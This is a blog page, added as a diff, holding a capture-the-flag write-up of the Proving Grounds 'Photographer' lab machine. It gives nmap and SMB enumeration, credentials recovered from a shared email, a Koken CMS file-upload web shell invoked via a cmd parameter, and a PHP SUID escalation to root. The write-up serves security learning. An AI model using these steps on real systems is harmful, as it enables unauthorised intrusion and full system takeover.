@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Photographer</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Photographer | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Photographer" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/09/25/Proving_grounds_Play-Photographer.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/25/Proving_grounds_Play-Photographer.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-25T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Photographer" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-09-25T02:00:00+05:30","datePublished":"2023-09-25T02:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Photographer","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/25/Proving_grounds_Play-Photographer.html"},"url":"http://localhost:4000/2023/09/25/Proving_grounds_Play-Photographer.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/09/25/Proving_grounds_Play-Photographer.html">
+    <h2 class="post-title">Proving grounds Play: Photographer</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Sep 25, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 414daa1886948e88a74c6b426076f14f <span class="o">(</span>RSA<span class="o">)</span>
+|   256 4da3d07a8f64ef82452d011318b7e013 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 1a017a4fcf9585bf31a14f1587ab94e2 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Photographer by v1n1v131r4
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+8000/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span> Koken 0.22.24
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: Koken 0.22.24
+|_http-title: daisa ahomi
+Service Info: Host: PHOTOGRAPHER<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="web-port-8000">Web PORT: 8000</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Photographer/web1.png" alt="img" /></p>
+
+<p>The meta data in the landing page <code class="language-plaintext highlighter-rouge">http://192.168.193.76:8000/</code> source revealed the CMS version.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"generator"</span> <span class="na">content=</span><span class="s">"Koken 0.22.24"</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+<p>The version <code class="language-plaintext highlighter-rouge">Koken 0.22.24</code> is vulnerable to <a href="https://www.exploit-db.com/exploits/48706">Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)</a>.</p>
+
+<h3 id="directory-fuzzing">Directory Fuzzing</h3>
+
+<p>http://192.168.193.76:8000/admin/</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Photographer/web2.png" alt="img" /></p>
+
+<h2 id="smb-share">SMB Share</h2>
+
+<p>Enumerate smb share.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|22:56|~/pg-play/Photographer<span class="nv">$ </span>smbclient <span class="nt">-L</span> //192.168.193.76/ <span class="nt">-N</span>
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	print<span class="nv">$ </span>         Disk      Printer Drivers
+	sambashare      Disk      Samba on Ubuntu
+	IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>photographer server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</code></pre></div></div>
+
+<p>Connect to SMB share.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|22:56|~/pg-play/Photographer<span class="nv">$ </span>smbclient  //192.168.193.76/sambashare <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Thu Aug 20 11:51:08 2020
+  ..                                  D        0  Thu Aug 20 12:08:59 2020
+  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
+  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020
+</code></pre></div></div>
+
+<p>Download mailsent.txt file and view to obtain the credentials for the admin portal.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
+Date: Mon, 20 Jul 2020 11:40:36 -0400
+From: Agi Clarence &lt;agi@photographer.com&gt;
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
+X-Accept-Language: en-us, en
+MIME-Version: 1.0
+To: Daisa Ahomi &lt;daisa@photographer.com&gt;
+Subject: To Do - Daisa Website's
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Transfer-Encoding: 7bit
+
+Hi Daisa!
+Your site is ready now.
+Don't forget your secret, my babygirl ;)
+</code></pre></div></div>
+
+<h2 id="credentials">Credentials</h2>
+
+<p><code class="language-plaintext highlighter-rouge">daisa@photographer.com: babygirl</code>
+Login to the koen admin portal.</p>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<p>After login to the admin portal Direct to <code class="language-plaintext highlighter-rouge">Library - Content - Import Content</code>.</p>
+
+<p>Create a php remote code execution code or a php reverse shell and save it as <code class="language-plaintext highlighter-rouge">image.php.jpg</code>. Use Burp Suite to intercept the image upload traffic and change the file name to <code class="language-plaintext highlighter-rouge">image.php</code>.</p>
+
+<p>Once the file is uploaded click on the file and on the right side scroll down and click view option. Then hover over the image download button and click to trigger the reverse shell.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.193.76:8000/storage/originals/f2/10/image.php?cmd=id
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Photographer/shell.png" alt="img" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="suid">SUID</h3>
+
+<p>Enumerate the SUIDs in the sysytem.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/php7.2     <span class="c">#Exploitable</span>
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+www-data@photographer:/<span class="err">$</span>
+</code></pre></div></div>
+
+<h3 id="gtfo-bins">GTFO Bins</h3>
+
+<p>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run <code class="language-plaintext highlighter-rouge">sh -p</code>, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p>
+
+<p>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo install</span> <span class="nt">-m</span> <span class="o">=</span>xs <span class="si">$(</span>which php<span class="si">)</span> <span class="nb">.</span>
+
+    <span class="nv">CMD</span><span class="o">=</span><span class="s2">"/bin/sh"</span>
+    ./php <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Photographer/root.png" alt="img" /></p>
+
+<p><strong>Root Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
